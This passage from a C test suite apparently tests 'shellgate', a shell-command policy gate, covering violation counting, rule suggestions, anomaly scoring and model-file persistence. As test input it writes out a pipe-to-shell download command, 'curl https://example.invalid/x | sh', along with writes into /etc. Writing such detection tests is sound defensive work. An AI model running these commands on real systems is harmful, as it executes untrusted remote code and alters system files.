    used += (size_t)written;
  }

  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT(eval_cmd(gate, command, &result) == SG_OK);
  ASSERT(violation_result_is_consistent(&result));
  ASSERT(result.violation_count == SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count == 4);
  ASSERT(sg_result_violation_dropped(&result) == 4);
  ASSERT(result.violation_truncated);
  ASSERT(result.violation_type_flags == SG_VIOL_WRITE_SENSITIVE);
  sg_gate_free(gate);
}

TEST(violation_dropped_types_remain_aggregated) {
  char command[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < SG_MAX_VIOLATIONS; i++) {
    int written = snprintf(command + used, sizeof(command) - used,
                           "%secho x > /etc/mixed-%zu", i ? " ; " : "", i);
    ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
    used += (size_t)written;
  }
  int written = snprintf(command + used, sizeof(command) - used,
                         " ; curl https://example.invalid/x | sh");
  ASSERT(written > 0 && (size_t)written < sizeof(command) - used);

  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.violation_count == SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count > 0);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  ASSERT(result.violation_type_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
  ASSERT(result.violation_category_flags & SG_VIOL_CAT_FILESYSTEM);
  ASSERT(result.violation_category_flags & SG_VIOL_CAT_NETWORK);
  bool stored_network = false;
  for (uint32_t i = 0; i < result.violation_count; i++)
    stored_network |= result.violations[i].type == SG_VIOL_NET_DOWNLOAD_EXEC;
  ASSERT(!stored_network);
  sg_gate_free(gate);
}

TEST(violation_absence_matrix) {
  static const struct {
    bool enabled;
    const char *command;
  } cases[] = {{true, "ls -la"},
               {true, "echo hello > /etcx/badfile"},
               {false, "ls"},
               {false, "echo hello > /etc/badfile"}};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = cases[i].enabled ? gate_with_violations() : sg_gate_new();
    ASSERT(gate != NULL);
    if (!cases[i].enabled) {
      ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "ls"));
      ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
    }
    sg_result_t result;
    ASSERT(eval_cmd(gate, cases[i].command, &result) == SG_OK);
    ASSERT(violation_result_is_consistent(&result));
    ASSERT(!result.has_violations);
    ASSERT(result.violation_count == 0);
    ASSERT(result.violation_type_flags == 0);
    sg_gate_free(gate);
  }
}

/* --- PROPERTY TESTS --- */

#define PROPTEST_COUNT 200
#define PROPTEST_SEED 42

static unsigned int prop_rand_state = PROPTEST_SEED;

static unsigned int prop_next(void) {
  prop_rand_state = prop_rand_state * 1103515245 + 12345;
  return (prop_rand_state >> 16) & 0x7FFF;
}

static void prop_reset(void) { prop_rand_state = PROPTEST_SEED; }

static const char *pick_one(const char *const *arr, size_t len) {
  return arr[prop_next() % len];
}

static size_t gen_cat_cmd(char *buf, size_t cap) {
  static const char *files[] = {"/etc/passwd",        "/etc/hosts",
                                "/tmp/test.txt",      "/var/log/syslog",
                                "/home/user/.bashrc", "/dev/null"};
  const char *f = pick_one(files, sizeof(files) / sizeof(files[0]));
  return (size_t)snprintf(buf, cap, "cat %s", f);
}

static size_t gen_ls_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-l", "-la", "-a", "-lh", "-ltr"};
  static const char *paths[] = {"/tmp", "/var/log", "/home/user", "/etc"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *path = pick_one(paths, sizeof(paths) / sizeof(paths[0]));
  return (size_t)snprintf(buf, cap, "ls %s %s", flag, path);
}

static size_t gen_grep_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-i", "-r", "-n", "-l", "-v"};
  static const char *patts[] = {"error", "warn", "INFO", "DEBUG", "failed"};
  static const char *paths[] = {"/var/log/syslog", "/tmp/test.log",
                                "/etc/passwd"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *patt = pick_one(patts, sizeof(patts) / sizeof(patts[0]));
  const char *path = pick_one(paths, sizeof(paths) / sizeof(paths[0]));
  return (size_t)snprintf(buf, cap, "grep %s %s %s", flag, patt, path);
}

static size_t gen_git_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {
      "git status",           "git log --oneline -5", "git diff HEAD~1",
      "git branch -a",        "git stash list",       "git remote -v",
      "git show HEAD --stat", "git tag -l",           "git reflog -3"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_docker_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {"docker ps",
                               "docker images",
                               "docker ps -a",
                               "docker container ls",
                               "docker volume ls",
                               "docker network ls",
                               "docker ps --format '{{.Names}}'",
                               "docker stats --no-stream"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_curl_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"-s", "-v", "-i", "-o /dev/null"};
  static const char *urls[] = {
      "https://api.github.com", "https://httpbin.org/get",
      "https://localhost:8080/health", "https://example.com"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *url = pick_one(urls, sizeof(urls) / sizeof(urls[0]));
  return (size_t)snprintf(buf, cap, "curl %s %s", flag, url);
}

static size_t gen_echo_cmd(char *buf, size_t cap) {
  static const char *msgs[] = {"hello", "world", "test", "ok", "done", "error"};
  const char *msg = pick_one(msgs, sizeof(msgs) / sizeof(msgs[0]));
  return (size_t)snprintf(buf, cap, "echo %s", msg);
}

static size_t gen_pwd_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "pwd");
}

static size_t gen_whoami_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "whoami");
}

static size_t gen_date_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "date");
}

static size_t gen_ps_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"aux", ""};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "ps %s", f);
}

static size_t gen_find_cmd(char *buf, size_t cap) {
  static const char *opts[] = {"-type f", "-type d", "-name '*.txt'",
                               "-type f -name '*.log'"};
  const char *opt = pick_one(opts, sizeof(opts) / sizeof(opts[0]));
  return (size_t)snprintf(buf, cap, "find /tmp %s -print", opt);
}

static size_t gen_sort_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-r", "-n"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "sort %s", f);
}

static size_t gen_head_tail_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {"head -5 /etc/passwd", "tail -3 /var/log/syslog",
                               "head -1 /etc/hosts", "tail -1 /etc/passwd"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_wc_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"-l", "-w", "-c"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "wc %s", f);
}

static size_t gen_uniq_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-c", "-d"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "uniq %s", f);
}

static size_t (*generators[])(char *, size_t) = {
    gen_cat_cmd,    gen_ls_cmd,        gen_grep_cmd, gen_git_cmd,
    gen_docker_cmd, gen_curl_cmd,      gen_echo_cmd, gen_pwd_cmd,
    gen_whoami_cmd, gen_date_cmd,      gen_ps_cmd,   gen_find_cmd,
    gen_sort_cmd,   gen_head_tail_cmd, gen_wc_cmd,   gen_uniq_cmd,
};

static const char *gen_name(size_t idx) {
  static const char *names[] = {
      "gen_cat_cmd",    "gen_ls_cmd",        "gen_grep_cmd", "gen_git_cmd",
      "gen_docker_cmd", "gen_curl_cmd",      "gen_echo_cmd", "gen_pwd_cmd",
      "gen_whoami_cmd", "gen_date_cmd",      "gen_ps_cmd",   "gen_find_cmd",
      "gen_sort_cmd",   "gen_head_tail_cmd", "gen_wc_cmd",   "gen_uniq_cmd"};
  return names[idx];
}

static size_t gen_by_index(char *buf, size_t cap, size_t idx) {
  return generators[idx % (sizeof(generators) / sizeof(generators[0]))](buf,
                                                                        cap);
}

TEST(glob_pattern_in_rule) {
  /* Regression: patterns with glob tokens (*.txt) were rejected by
   * parse_pattern because *.txt matched the * (ANY) symbol prefix
   * and .txt was treated as an invalid parameter suffix. */
  static const struct {
    const char *rule;
    const char *command;
  } cases[] = {
      {"echo *.txt", "echo *.txt"},
      {"find #p #sopt *.txt -print", "find /tmp -name '*.txt' -print"},
      {"find #p #sopt #glob -print", "find /tmp -name '*.txt' -print"}};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_SG_OK(sg_gate_add_allow_cpl(g, cases[i].rule));
    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].command, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT_STR(result.subcommands[0].display_command, cases[i].command);
    sg_gate_free(g);
  }
}

TEST(property_suggestion_leads_to_allow) {
  char cmd_buf[512];
  char suggestion_buf[512];
  size_t total_round_trips = 0;

  for (size_t gi = 0; gi < sizeof(generators) / sizeof(generators[0]); gi++) {
    int failures_before = fail_count;
    prop_reset();

    sg_gate_t *g = sg_gate_new();
    size_t generator_round_trips = 0;

    for (int i = 0; i < PROPTEST_COUNT; i++) {
      memset(cmd_buf, 0, sizeof(cmd_buf));
      gen_by_index(cmd_buf, sizeof(cmd_buf), gi);

      sg_result_t r;
      ASSERT_SG_OK(eval_cmd(g, cmd_buf, &r));

      if (r.subcommand_count == 0 || r.subcommands[0].display_command == NULL) {
        continue;
      }
      if (r.subcommands[0]
              .display_command[strlen(r.subcommands[0].display_command)] !=
          '\0') {
        printf(
            "    FAIL: gen=%s iter=%d result not null-terminated cmd=\"%s\"\n",
            gen_name(gi), i, cmd_buf);
        fail_count++;
        continue;
      }

      if (r.verdict == SG_VERDICT_ALLOW) {
        continue;
      }

      if (r.verdict != SG_VERDICT_UNDETERMINED) {
        continue;
      }

      if (r.suggestion_count == 0 || r.suggestions[0] == NULL) {
        continue;
      }

      int pick = prop_next() % r.suggestion_count;
      snprintf(suggestion_buf, sizeof(suggestion_buf), "%s",
               r.suggestions[pick]);
      if (sg_gate_add_allow_cpl(g, suggestion_buf) != SG_OK) {
        printf("    FAIL: gen=%s iter=%d could not add suggestion[%d]\n",
               gen_name(gi), i, pick);
        fail_count++;
        continue;
      }
      generator_round_trips++;
      total_round_trips++;

      sg_result_t r2;
      ASSERT_SG_OK(eval_cmd(g, cmd_buf, &r2));

      if (r2.verdict != SG_VERDICT_ALLOW) {
        printf("    FAIL: gen=%s iter=%d suggestion[%d]=\"%s\" still %d "
               "cmd=\"%s\"\n",
               gen_name(gi), i, pick, suggestion_buf, r2.verdict, cmd_buf);
        fail_count++;
      }
    }

    sg_gate_free(g);
    ASSERT(fail_count == failures_before);
    ASSERT(generator_round_trips > 0);
    printf("    checked: %s (%zu suggestion round-trips)\n", gen_name(gi),
           generator_round_trips);
  }
  ASSERT(total_round_trips > 0);
}

/* --- ANOMALY DETECTION TESTS --- */

TEST(anomaly_enable_disable) {
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  const char *sequence = "cat /etc/hosts ; grep root ; sort";
  ASSERT_SG_OK(sg_gate_set_stop_mode(g, SG_EVAL_ALL));

  /* Initially disabled */
  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), 0);

  /* Enabling starts a fresh model that learns the evaluated sequence. */
  sg_error_t err = sg_gate_enable_anomaly(g, 5.0, NULL);
  ASSERT(err == SG_OK);
  ASSERT(!sg_gate_anomaly_had_error(g));
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(isinf(r.anomaly_score));
  ASSERT(r.anomaly_detected == false);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), 3);

  /* Disabling drops the model and restores inert anomaly results. */
  sg_gate_disable_anomaly(g);
  ASSERT(!sg_gate_anomaly_had_error(g));
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(r.anomaly_score == 0.0);
  ASSERT(r.anomaly_detected == false);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), 0);

  sg_gate_free(g);
}

TEST(anomaly_learning_policy_matrix) {
  static const struct {
    bool update_only_on_allow;
    const char *command;
    sg_verdict_t verdict;
    size_t expected_vocab;
  } verdict_cases[] = {
      {false, "allowed", SG_VERDICT_ALLOW, 1},
      {false, "unknown", SG_VERDICT_UNDETERMINED, 1},
      {false, "denied", SG_VERDICT_DENY, 1},
      {true, "allowed", SG_VERDICT_ALLOW, 1},
      {true, "unknown", SG_VERDICT_UNDETERMINED, 0},
      {true, "denied", SG_VERDICT_DENY, 0},
  };

  for (size_t i = 0; i < sizeof(verdict_cases) / sizeof(verdict_cases[0]);
       i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_update_mode(
               g, verdict_cases[i].update_only_on_allow) == SG_OK);
    ASSERT(sg_gate_add_allow_cpl(g, "allowed") == SG_OK);
    ASSERT(sg_gate_add_deny_cpl(g, "denied") == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, verdict_cases[i].command, &result) == SG_OK);
    ASSERT(result.verdict == verdict_cases[i].verdict);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g),
                   verdict_cases[i].expected_vocab);
    sg_gate_free(g);
  }

  static const bool skip_anomalous[] = {true, false};
  for (size_t i = 0; i < sizeof(skip_anomalous) / sizeof(skip_anomalous[0]);
       i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, -1.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_skip_on_detected(g, skip_anomalous[i]) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, "base1 ; base2 ; base3", &result) == SG_OK);
    ASSERT(!result.anomaly_detected);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), 3);
    ASSERT(eval_cmd(g, "novel1 ; novel2 ; novel3", &result) == SG_OK);
    ASSERT(result.anomaly_detected);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), skip_anomalous[i] ? 3 : 6);
    sg_gate_free(g);
  }
}

TEST(anomaly_scoring_contract_matrix) {
  /* Short sequences cannot be scored and therefore remain non-anomalous. */
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cd"));

  sg_result_t r;

  ASSERT_SG_OK(eval_cmd(g, "ls", &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0); /* Short sequence, score is 0 */
  ASSERT(r.anomaly_score_raw == 0.0);
  ASSERT(r.anomaly_score_type == 0.0);

  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp", &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0);
  ASSERT(r.anomaly_score_raw == 0.0);
  ASSERT(r.anomaly_score_type == 0.0);

  /* Three or more commands produce an observable score. */
  ASSERT(eval_cmd(g, "ls ; cd /tmp ; pwd", &r) == SG_OK);
  ASSERT(!isnan(r.anomaly_score));
  sg_gate_free(g);

  static const struct {
    double threshold;
    bool detected;
  } threshold_cases[] = {{-1.0, true}, {1e300, false}};
  for (size_t i = 0; i < sizeof(threshold_cases) / sizeof(threshold_cases[0]);
       i++) {
    g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(g, threshold_cases[i].threshold, NULL));
    for (int repetition = 0; repetition < 5; repetition++)
      ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
    ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(g, true));
    ASSERT_SG_OK(eval_cmd(g, "gcc ; make ; test", &r));
    ASSERT(isfinite(r.anomaly_score));
    ASSERT(r.anomaly_detected == threshold_cases[i].detected);
    sg_gate_free(g);
  }

  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cd"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "pwd"));
  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  size_t stable_vocab = sg_gate_anomaly_vocab_size(g);
  ASSERT(stable_vocab > 0);
  for (int i = 1; i < 10; i++)
    ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  ASSERT(isfinite(r.anomaly_score_raw) && r.anomaly_score_raw >= 0.0);
  ASSERT(isfinite(r.anomaly_score_type) && r.anomaly_score_type >= 0.0);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), stable_vocab);
  double expected = r.anomaly_score_raw * 0.5 + r.anomaly_score_type * 0.5;
  ASSERT(fabs(r.anomaly_score - expected) < 0.0001);
  ASSERT_SG_OK(eval_cmd(g, "gcc ; make ; test", &r));
  ASSERT(isfinite(r.anomaly_score_raw) && r.anomaly_score_raw > 0.0);
  sg_gate_free(g);

  static const struct {
    const char *command;
    sg_verdict_t verdict;
    bool scorable;
  } shape_cases[] = {
      {"ls", SG_VERDICT_ALLOW, false},
      {"cd /tmp", SG_VERDICT_ALLOW, false},
      {"pwd", SG_VERDICT_ALLOW, false},
      {"ls ; cd /tmp", SG_VERDICT_ALLOW, false},
      {"cd /tmp ; pwd ; ls", SG_VERDICT_ALLOW, true},
      {"cat /etc/passwd | head", SG_VERDICT_UNDETERMINED, false},
  };
  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cd"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "pwd"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cat"));
  stable_vocab = 0;
  for (size_t pass = 0; pass < 2; pass++) {
    for (size_t i = 0; i < sizeof(shape_cases) / sizeof(shape_cases[0]); i++) {
      ASSERT_SG_OK(eval_cmd(g, shape_cases[i].command, &r));
      ASSERT(r.verdict == shape_cases[i].verdict);
      if (pass == 1 && shape_cases[i].scorable) {
        ASSERT(isfinite(r.anomaly_score));
        ASSERT(isfinite(r.anomaly_score_raw));
        ASSERT(isfinite(r.anomaly_score_type));
      }
    }
    if (pass == 0) {
      stable_vocab = sg_gate_anomaly_vocab_size(g);
      ASSERT(stable_vocab > 0);
    } else {
      ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), stable_vocab);
    }
  }
  sg_gate_free(g);
}

TEST(anomaly_model_roundtrip) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  static const char *probe = "cat 42 ; grep -E error ; sort";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  sg_result_t result;
  for (int i = 0; i < 30; i++)
    ASSERT(eval_cmd(g, training, &result) == SG_OK);

  const char *path = temp_policy_file();
  char type_path[320];
  snprintf(type_path, sizeof(type_path), "%s_type", path);
  register_temp_file(type_path);
  ASSERT(sg_gate_save_anomaly_model(g, path) == SG_OK);
  ASSERT(access(type_path, F_OK) != 0);

  sg_gate_t *g2 = sg_gate_new();
  ASSERT(g2 != NULL);
  ASSERT(sg_gate_enable_anomaly(g2, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_load_anomaly_model(g2, path) == SG_OK);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g2), sg_gate_anomaly_vocab_size(g));

  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_anomaly_update_mode(g2, true) == SG_OK);
  sg_result_t expected, actual;
  ASSERT(eval_cmd(g, probe, &expected) == SG_OK);
  ASSERT(eval_cmd(g2, probe, &actual) == SG_OK);
  ASSERT(isfinite(expected.anomaly_score_raw));
  ASSERT(isfinite(expected.anomaly_score_type));
  ASSERT(expected.anomaly_score_raw != expected.anomaly_score_type);
  ASSERT(actual.anomaly_score_raw == expected.anomaly_score_raw);
  ASSERT(actual.anomaly_score_type == expected.anomaly_score_type);
  ASSERT(actual.anomaly_score == expected.anomaly_score);

  sg_gate_t *invalid = sg_gate_new();
  ASSERT(invalid != NULL);
  ASSERT(sg_gate_save_anomaly_model(invalid, path) == SG_ERR_INVALID);
  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_INVALID);
  ASSERT(sg_gate_enable_anomaly(invalid, 100.0, NULL) == SG_OK);
  ASSERT(eval_cmd(invalid, "one ; two ; three ; four", &actual) == SG_OK);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(invalid), 4);

  /* Gate persistence intentionally rejects standalone single-model files. */
  sg_anomaly_model_t *legacy = sg_anomaly_model_new();
  ASSERT(legacy != NULL);
  const char legacy_seq[] = "3:one,3:two,5:three,";
  ASSERT(sg_anomaly_model_update_netseq(
             legacy, legacy_seq, sizeof(legacy_seq) - 1) == SG_ANOMALY_OK);
  ASSERT(sg_anomaly_model_save(legacy, path) == SG_ANOMALY_OK);
  sg_anomaly_model_free(legacy);
  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_PARSE);
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(invalid), 4);

  char missing_path[256];
  snprintf(missing_path, sizeof(missing_path), "/tmp/shellgate_missing_%d",
           getpid());
  unlink(missing_path);
  ASSERT(sg_gate_load_anomaly_model(invalid, missing_path) == SG_ERR_IO);
  sg_gate_free(invalid);
  sg_gate_free(g2);
  sg_gate_free(g);
}

TEST(anomaly_bundle_corruption_matrix) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  sg_gate_t *target = sg_gate_new();
  ASSERT(source != NULL && target != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
  sg_result_t result;
  for (int i = 0; i < 8; i++)
    ASSERT_SG_OK(eval_cmd(source, training, &result));
  ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
  size_t preserved_vocab = sg_gate_anomaly_vocab_size(target);
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  FILE *file = fopen(path, "rb");
  ASSERT(file != NULL);
  ASSERT(fseek(file, 0, SEEK_END) == 0);
  long length = ftell(file);
  ASSERT(length > 32 && fseek(file, 0, SEEK_SET) == 0);
  unsigned char *valid = malloc((size_t)length + 1);
  unsigned char *data = malloc((size_t)length + 1);
  ASSERT(valid != NULL && data != NULL);
  ASSERT(fread(valid, 1, (size_t)length, file) == (size_t)length);
  ASSERT(fclose(file) == 0);

  enum corruption { BAD_MAGIC, BAD_LENGTH, BAD_CHECKSUM, TRUNCATED, TRAILING };
  static const enum corruption cases[] = {BAD_MAGIC, BAD_LENGTH, BAD_CHECKSUM,
                                          TRUNCATED, TRAILING};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    memcpy(data, valid, (size_t)length);
    size_t write_length = (size_t)length;
    switch (cases[i]) {
    case BAD_MAGIC:
      data[0] ^= 0xff;
      break;
    case BAD_LENGTH:
      memset(data + 8, 0xff, 8);
      break;
    case BAD_CHECKSUM:
      data[24] ^= 1;
      break;
    case TRUNCATED:
      write_length--;
      break;
    case TRAILING:
      data[write_length++] = 'x';
      break;
    }
    file = fopen(path, "wb");
    ASSERT(file != NULL);
    ASSERT(fwrite(data, 1, write_length, file) == write_length);
    ASSERT(fclose(file) == 0);
    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_PARSE);
    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target), preserved_vocab);
  }

  file = fopen(path, "wb");
  ASSERT(file != NULL);
  ASSERT(fwrite(valid, 1, (size_t)length, file) == (size_t)length);
  ASSERT(fclose(file) == 0);
  ASSERT_SG_OK(sg_gate_load_anomaly_model(target, path));
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target),
                 sg_gate_anomaly_vocab_size(source));
  free(data);
  free(valid);
  sg_gate_free(target);
  sg_gate_free(source);
}

TEST(anomaly_bundle_failure_atomicity) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  char stale_path[320];
  ASSERT(snprintf(stale_path, sizeof(stale_path), "%s.stale", path) > 0);
  FILE *stale = fopen(stale_path, "wb");
  ASSERT(stale != NULL);
  ASSERT(fputs("incomplete anomaly bundle", stale) >= 0);
  ASSERT(fclose(stale) == 0);
  register_temp_file(stale_path);
  sg_gate_t *first = sg_gate_new();
  sg_gate_t *second = sg_gate_new();
  ASSERT(first != NULL && second != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(first, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(second, 100.0, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(first, "one ; two ; three", &result));
  ASSERT_SG_OK(eval_cmd(second, "one ; two ; three ; four", &result));
  size_t first_vocab = sg_gate_anomaly_vocab_size(first);
  size_t second_vocab = sg_gate_anomaly_vocab_size(second);
  ASSERT(first_vocab != second_vocab);

  sg_test_io_reset();
  ASSERT_SG_OK(sg_gate_save_anomaly_model(first, path));
  size_t io_operations = sg_test_io_count();
  sg_test_io_reset();
  ASSERT(io_operations > 0);

  for (size_t i = 1; i <= io_operations; i++) {
    ASSERT_SG_OK(sg_gate_save_anomaly_model(first, path));
    sg_test_io_fail_at(i);
    ASSERT(sg_gate_save_anomaly_model(second, path) == SG_ERR_IO);
    sg_test_io_reset();
    ASSERT(access(stale_path, F_OK) == 0);

    sg_gate_t *loaded = sg_gate_new();
    ASSERT(loaded != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(loaded, 100.0, NULL));
    ASSERT_SG_OK(sg_gate_load_anomaly_model(loaded, path));
    size_t loaded_vocab = sg_gate_anomaly_vocab_size(loaded);
    /* A post-rename directory-sync failure may report I/O after the complete
     * replacement became visible. Either generation is valid; a partial one
     * is never visible. */
    ASSERT(loaded_vocab == first_vocab || loaded_vocab == second_vocab);
    sg_gate_free(loaded);
  }

  ASSERT(chmod(path, 0640) == 0);
  ASSERT_SG_OK(sg_gate_save_anomaly_model(second, path));
  ASSERT(access(stale_path, F_OK) == 0);
  struct stat status;
  ASSERT(stat(path, &status) == 0);
  ASSERT((status.st_mode & 0777) == 0640);

  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_save_anomaly_model(first, path) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  sg_gate_t *preserved = sg_gate_new();
  ASSERT(preserved != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(preserved, 100.0, NULL));
  ASSERT_SG_OK(sg_gate_load_anomaly_model(preserved, path));
  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(preserved), second_vocab);
  sg_gate_free(preserved);
  sg_gate_free(second);
  sg_gate_free(first);
}

TEST(anomaly_bundle_load_allocation_failure) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = sg_gate_new();
  ASSERT(source != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(source, "cat a ; grep b ; sort", &result));
  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));

  sg_gate_t *probe = sg_gate_new();
  ASSERT(probe != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, NULL));
  sg_test_alloc_reset();
  ASSERT_SG_OK(sg_gate_load_anomaly_model(probe, path));
  size_t allocation_count = sg_test_alloc_count();
  sg_test_alloc_reset();
  sg_gate_free(probe);
  ASSERT(allocation_count > 0);

  for (size_t i = 1; i <= allocation_count; i++) {
    sg_gate_t *target = sg_gate_new();
    ASSERT(target != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, NULL));
    ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
    size_t preserved_vocab = sg_gate_anomaly_vocab_size(target);
    sg_test_alloc_fail_at(i);
